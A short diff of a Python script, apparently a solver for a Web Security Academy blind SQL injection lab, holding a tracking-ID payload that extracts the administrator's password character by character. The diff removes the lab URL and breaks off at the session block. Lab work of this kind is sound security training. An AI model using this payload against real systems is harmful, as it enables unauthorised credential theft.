@@ -1,9 +1,10 @@
 from requests import Session
-from time import sleep
 from string import digits, ascii_letters, punctuation
 
-BASE_URL = 'https://0a9900e2044e4487c0be406200da003c.web-security-academy.net'
-PATH = '/login'
+BASE_URL = ''
+PATH = ''
+
+# SQLi in Tracking ID of website
 TRACKING_ID = "MfI1Ftgs9J7FJLIl' AND SUBSTRING((SELECT Password FROM users WHERE Username = 'administrator'), {char_no}, 1) = '{letter}"
 
 with Session() as s:
